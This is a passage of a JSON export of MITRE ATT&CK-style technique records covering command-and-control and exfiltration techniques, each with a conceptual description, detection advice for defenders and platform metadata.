and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":659,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":659,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":659,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":670,"name":"T1090.003 - Multi-hop Proxy","sort_id":0,"external_id":"T1090.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"When observing use of Multi-hop proxies, network data from the actual command and control servers could allow correlating incoming and outgoing flows to trace malicious traffic back to its source. Multi-hop proxies can also be detected by alerting on traffic to known anonymity networks (such as [Tor](https:\/\/attack.mitre.org\/software\/S0183)) or known adversary infrastructure that uses this technique.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":670,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":670,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":670,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":676,"name":"T1132.002 - Non-Standard Encoding","sort_id":0,"external_id":"T1132.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":676,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":676,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":676,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":677,"name":"T1571 - Non-Standard Port","sort_id":0,"external_id":"T1571","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis\/parsing of network data.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":677,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":677,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":677,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":682,"name":"T1102.003 - One-Way Communication","sort_id":0,"external_id":"T1102.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.<\/p>\n<p>Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL\/TLS encryption, giving adversaries an added level of protection.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL\/TLS inspection if data is encrypted. Analyze network data for uncommon data flows. User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":682,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":682,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":682,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":710,"name":"T1001.003 - Protocol Impersonation","sort_id":0,"external_id":"T1001.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  <\/p>\n<p>Adversaries may impersonate a fake SSL\/TLS handshake to make it look like subsequent traffic is SSL\/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":710,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":710,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":710,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":711,"name":"T1572 - Protocol Tunneling","sort_id":0,"external_id":"T1572","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection\/network filtering and\/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and\/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. <\/p>\n<p>There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling) <\/p>\n<p><a href=\"https:\/\/attack.mitre.org\/techniques\/T1572\">Protocol Tunneling<\/a> may also be abused by adversaries during <a href=\"https:\/\/attack.mitre.org\/techniques\/T1568\">Dynamic Resolution<\/a>. Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) <\/p>\n<p>Adversaries may also leverage <a href=\"https:\/\/attack.mitre.org\/techniques\/T1572\">Protocol Tunneling<\/a> in conjunction with <a href=\"https:\/\/attack.mitre.org\/techniques\/T1090\">Proxy<\/a> and\/or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1001\/003\">Protocol Impersonation<\/a> to further conceal C2 communications and infrastructure. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitoring for systems listening and\/or establishing external connections using ports\/protocols commonly associated with tunneling, such as SSH (port 22). Also monitor for processes commonly associated with tunneling, such as Plink and the OpenSSH client. \n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":711,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":711,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":711,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":758,"name":"T1132.001 - Standard Encoding","sort_id":0,"external_id":"T1132.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":758,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":758,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":758,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":762,"name":"T1001.002 - Steganography","sort_id":0,"external_id":"T1001.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":762,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":762,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":762,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":766,"name":"T1573.001 - Symmetric Cryptography","sort_id":0,"external_id":"T1573.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"With symmetric encryption, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":766,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":766,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":766,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":788,"name":"T1071.001 - Web Protocols","sort_id":0,"external_id":"T1071.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Adversaries may communicate using application layer protocols associated with web traffic to avoid detection\/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. <\/p>\n<p>Protocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP\/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\n\nMonitor for web traffic to\/from known-bad or suspicious domains. ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":788,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":788,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":788,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":802,"name":"T1544 - Remote File Copy","sort_id":0,"external_id":"T1544","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":17,"description":"<p>Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or onto the victim\u2019s device.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:21","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Downloading remote files is common application behavior and is therefore typically undetectable to the end user.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":802,"platform_id":10,"created_at":"2020-07-28 16:02:21","updated_at":"2020-07-28 16:02:21"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":802,"platform_id":11,"created_at":"2020-07-28 16:02:21","updated_at":"2020-07-28 16:02:21"}}]}]},{"id":22,"name":"Exfiltration","source_name":"ENTERPRISE_exfiltration","sort_id":0,"external_id":"TA0010","category_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"framework_stage_id":18,"tactic_id":22},"techniques":[{"id":167,"name":"T1020 - Automated Exfiltration","sort_id":0,"external_id":"T1020","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. <\/p>\n<p>When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1041\">Exfiltration Over C2 Channel<\/a> and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1048\">Exfiltration Over Alternative Protocol<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":167,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":167,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":167,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":204,"name":"T1002 - Data Compressed","sort_id":0,"external_id":"T1002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":204,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":204,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":204,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":207,"name":"T1022 - Data Encrypted","sort_id":0,"external_id":"T1022","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file archive formats that can encrypt files are RAR and zip.<\/p>\n<p>Other exfiltration techniques likely apply as well to transfer the information out of the network, such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1041\">Exfiltration Over Command and Control Channel<\/a> and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1048\">Exfiltration Over Alternative Protocol<\/a><\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":207,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":207,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":207,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":211,"name":"T1030 - Data Transfer Size Limits","sort_id":0,"external_id":"T1030","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":211,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":211,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":211,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":235,"name":"T1048 - Exfiltration Over Alternative Protocol","sort_id":0,"external_id":"T1048","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  <\/p>\n<p>Alternate protocols include FTP, SMTP, HTTP\/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may also opt to encrypt and\/or obfuscate these alternate channels. <\/p>\n<p><a href=\"https:\/\/attack.mitre.org\/techniques\/T1048\">Exfiltration Over Alternative Protocol<\/a> can be done using various common operating system utilities such as <a href=\"https:\/\/attack.mitre.org\/software\/S0039\">Net<\/a>\/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) <\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":235,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":235,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":235,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":236,"name":"T1041 - Exfiltration Over C2 Channel","sort_id":0,"external_id":"T1041","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows 